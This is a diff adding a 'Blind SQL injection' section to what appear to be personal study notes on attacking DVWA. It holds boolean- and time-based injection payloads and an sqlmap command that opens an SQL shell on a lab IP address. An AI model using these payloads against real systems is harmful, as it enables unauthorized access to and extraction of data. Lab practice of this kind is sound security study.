@@ -36,3 +36,29 @@ python ./sqlmap.py -u "http://161.35.202.77/vulnerabilities/sqli/?id=1&Submit=Su
 ```sh
 python ./sqlmap.py -u "http://161.35.202.77/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie="PHPSESSID=d4ool8gsr78mnro6cas6mrlf35; security=low" --sql-shell
 ```
+
+
+## Bling SQL injection 
+
+##### Finding blind sqli (boolien based)
+```sql
+1' and 1 = 1 #
+```
+##### Finding database name length (boolien based)
+```
+1' and length(database())=4 #
+```
+
+##### Finding blind sqli (time based)
+```sql
+1' and sleep(5)#
+```
+
+##### Determine the first letter of the database name (time-based)
+```
+1' and if(substr((database()),1,1) = 'a' , sleep(3), 1) #
+```
+
+
+
+
